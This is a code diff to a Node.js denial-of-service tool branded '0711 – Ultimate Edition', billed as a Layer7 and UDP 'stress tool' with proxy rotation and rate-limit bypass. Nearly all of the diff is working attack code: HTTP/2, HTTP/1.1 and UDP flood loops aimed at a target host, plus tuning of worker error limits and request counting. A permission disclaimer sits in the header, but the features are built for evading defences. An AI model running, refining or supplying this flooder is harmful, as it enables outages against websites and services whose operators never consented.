@@ -1,4 +1,22 @@
-#!/usr/bin/env node 
+#!/usr/bin/env node
+/**
+ * =====================================================================
+ *                         🔱 0711 – ULTIMATE EDITION 🔱
+ *                 Multi‑Worker Layer7 & UDP Stress Tool
+ *           Proxy Rotation, Rate‑Limit Bypass, Auto‑Heal,
+ *           Multi‑Target, Real‑time Dashboard, Report Generator
+ * =====================================================================
+ * 
+ * USAGE:
+ *   node 0711.js --target example.com --port 443 --workers 50 --duration 120
+ *   node 0711.js --targets targets.txt --proxy-auto --workers 100
+ *   node 0711.js --target example.com --config config.json
+ *   node 0711.js --example-config
+ * 
+ * ⚠️  WARNING: Use only on systems you own or have explicit permission.
+ *     Unauthorized use is ILLEGAL and may result in criminal penalties.
+ * =====================================================================
+ */
 
 // ===== Impor Modul =====
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
@@ -45,7 +63,8 @@ const CONFIG = {
     dashboardPort: 8080,
     logFile: '0711.log',
     verbose: false,
-    maxConsecutiveFailures: 5,
+    maxConsecutiveFailures: 3,
+    maxErrorsPerWorker: 1000,
     backoffBase: 1000,
     maxBackoff: 30000,
     customHeaders: {},
@@ -339,10 +358,11 @@ async function main() {
                             CHARSET: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
                             proxyList: this.proxyList,
                             payloadTemplates: this.payloadTemplates,
-                            maxConsecutiveFailures: this.config.maxConsecutiveFailures,
-                            backoffBase: this.config.backoffBase,
-                            maxBackoff: this.config.maxBackoff,
-                            verbose: this.config.verbose,
+                            maxConsecutiveFailures: this.config.maxConsecutiveFailures || 3,
+                            maxErrorsPerWorker: this.config.maxErrorsPerWorker || 1000,
+                            backoffBase: this.config.backoffBase || 1000,
+                            maxBackoff: this.config.maxBackoff || 30000,
+                            verbose: this.config.verbose || false,
                             customHeaders: this.config.customHeaders || {},
                         };
 
@@ -388,9 +408,8 @@ async function main() {
             // Stats printer (tanpa clear screen, tanpa banner)
             const statsInterval = setInterval(() => {
                 const elapsed = (Date.now() - this.stats.startTime) / 1000;
-                const rate = this.stats.total / elapsed || 0;
+                const rate = this.stats.total / (elapsed || 1);
                 const successRate = this.stats.total > 0 ? ((this.stats.success / this.stats.total) * 100).toFixed(1) : 0;
-                // Cetak stats langsung ke console tanpa clear
                 console.log(`\x1b[36m[STATS]\x1b[0m Total: ${this.stats.total} | Success: ${this.stats.success} | Failed: ${this.stats.failed} | ServerErr: ${this.stats.serverErrors} | Active: ${this.stats.activeWorkers} | Rate: ${rate.toFixed(1)} req/s | SuccessRate: ${successRate}% | Elapsed: ${elapsed.toFixed(1)}s`);
             }, 1000);
 
@@ -478,7 +497,7 @@ const http = require('http');
 const {
     targetIP, port, attackType, mode, durationMs, httpMethod,
     workerId, USER_AGENTS, CHARSET, proxyList, payloadTemplates,
-    maxConsecutiveFailures, backoffBase, maxBackoff, verbose, customHeaders,
+    maxConsecutiveFailures, maxErrorsPerWorker, backoffBase, maxBackoff, verbose, customHeaders,
 } = workerData;
 
 let sent = 0, active = 0, errors = 0, serverErrors = 0;
@@ -506,7 +525,15 @@ function getProxy() {
 }
 
 function sendStats(extra = {}) {
-    parentPort.postMessage({ type: 'stats', sent, active, errors, serverErrors, ...extra });
+    parentPort.postMessage({
+        type: 'stats',
+        sent: sent,
+        active: active,
+        errors: errors,
+        serverErrors: serverErrors,
+        success: sent - errors - serverErrors,
+        ...extra,
+    });
 }
 
 function sendLog(message) {
@@ -523,9 +550,25 @@ function cleanup(reason) {
     parentPort.postMessage({ type: 'done', workerId });
 }
 
+// --- Timer durasi ---
+if (durationMs && durationMs > 0) {
+    durationTimer = setTimeout(() => {
+        cleanup('Duration limit reached');
+    }, durationMs);
+}
+
+// --- HTTP/2 Attack ---
 async function http2Attack() {
     let attempt = 0;
     while (!isStopping) {
+        sent++; // SETIAP PERCOBAAN DIHITUNG
+
+        // Batasi error
+        if (errors > maxErrorsPerWorker) {
+            cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
+            return;
+        }
+
         try {
             const proxy = getProxy();
             let tlsConn;
@@ -587,8 +630,12 @@ async function http2Attack() {
 
             const req = client.request(headers);
             req.on('response', (response) => {
-                sent++;
                 consecutiveFailures = 0;
+                // Tentukan status
+                let status = response.headers[':status'] || 0;
+                if (status >= 200 && status < 400) {
+                    // success dihitung dari total - errors - serverErrors
+                }
                 sendStats();
                 req.destroy();
                 client.destroy();
@@ -609,7 +656,7 @@ async function http2Attack() {
             consecutiveFailures++;
             sendStats();
             if (consecutiveFailures >= maxConsecutiveFailures) {
-                cleanup(\`Max failures reached: \${err.message}\`);
+                cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);
                 return;
             }
             await sleep(2000 + rand(3000));
@@ -617,9 +664,16 @@ async function http2Attack() {
     }
 }
 
+// --- HTTP/1.1 Attack ---
 async function httpAttack() {
     let attempt = 0;
     while (!isStopping) {
+        sent++;
+        if (errors > maxErrorsPerWorker) {
+            cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
+            return;
+        }
+
         try {
             const proxy = getProxy();
             const options = {
@@ -645,7 +699,6 @@ async function httpAttack() {
 
             const req = http.request(options);
             req.on('response', (response) => {
-                sent++;
                 consecutiveFailures = 0;
                 sendStats();
                 req.destroy();
@@ -664,7 +717,7 @@ async function httpAttack() {
             consecutiveFailures++;
             sendStats();
             if (consecutiveFailures >= maxConsecutiveFailures) {
-                cleanup(\`Max failures reached: \${err.message}\`);
+                cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);
                 return;
             }
             await sleep(2000 + rand(3000));
@@ -672,6 +725,7 @@ async function httpAttack() {
     }
 }
 
+// --- UDP Attack ---
 async function udpAttack() {
     const udpSocket = dgram.createSocket('udp4');
     udpSocket.on('error', (err) => {
@@ -682,12 +736,17 @@ async function udpAttack() {
 
     const startTime = Date.now();
     while (!isStopping) {
+        sent++;
+        if (errors > maxErrorsPerWorker) {
+            cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
+            return;
+        }
         if (durationMs && Date.now() - startTime > durationMs) break;
         try {
             const payload = Buffer.from(randStr(500 + rand(500)));
             udpSocket.send(payload, port, targetIP, (err) => {
                 if (err) { errors++; sendStats(); }
-                else { sent++; if (active===0) active=1; sendStats(); }
+                else { sendStats(); }
             });
             await sleep(5 + rand(15));
         } catch (e) { errors++; sendStats(); }
@@ -696,7 +755,7 @@ async function udpAttack() {
     cleanup('UDP finished');
 }
 
-// Timeout monitoring
+// --- Timeout monitoring (log Request Timed Out) ---
 let timeoutCounter = 0;
 const timeoutInterval = setInterval(() => {
     if (isStopping) { clearInterval(timeoutInterval); return; }
@@ -713,6 +772,7 @@ parentPort.on('message', (msg) => {
     }
 });
 
+// --- Start ---
 if (attackType === 'udp') {
     udpAttack();
 } else if (port === 443 || attackType === 'https') {
@@ -723,7 +783,6 @@ if (attackType === 'udp') {
 `;
 
     // ===== Eksekusi =====
-    // Banner dihilangkan, langsung info
     logger.info('Initializing 0711 Ultimate Edition...');
 
     if (config.proxyAuto || config.proxyFile) {
@@ -782,4 +841,4 @@ if (require.main === module) {
         console.error('\x1b[31m[FATAL]\x1b[0m', err);
         process.exit(1);
     });
-}
+                }
